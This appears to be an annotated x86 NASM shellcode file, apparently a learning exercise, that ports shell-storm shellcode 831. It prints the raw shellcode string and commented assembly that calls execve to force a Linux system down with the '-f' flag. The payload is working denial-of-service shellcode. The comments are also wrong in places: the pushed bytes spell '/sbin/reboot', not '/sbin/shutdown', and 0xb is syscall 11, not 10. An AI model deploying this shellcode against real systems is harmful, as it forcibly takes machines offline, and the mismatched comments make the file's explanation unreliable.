; Filename: shutdown.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Shutdown shellcode from shell-storm
; 	        www.shell-storm.org/shellcode/files/shellcode-831.php
;Shellcode : "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"



global _start			

section .text
_start:

;int execve(const char *filename, char *const argv[],char *const envp[]);

xor eax, eax	; clear eax
push eax	; push eax to stack (0)
push 0x746f6f62	; push /sbin/shutdown to stack
push 0x65722f6e ;
push 0x6962732f ;
mov ebx, esp	; stack pointer to ebx pointing to /sbin/shutdown
push eax	; push eax to stack (0)
push word 0x662d 	; pushw - push '-f' to stack
mov esi, esp	; move stack pointer to esi pointing to -f on the stack
push eax	; push eax to stack (0)
push esi	; push esi to stack, pointer to -f
push ebx	; push ebx, /sbin/shutdown
mov ecx, esp	; put stack pointer into ecx for struct parameter
mov al, 0xb	; move 10 to eax for the execve syscall
int 0x80	;interupt to syscall
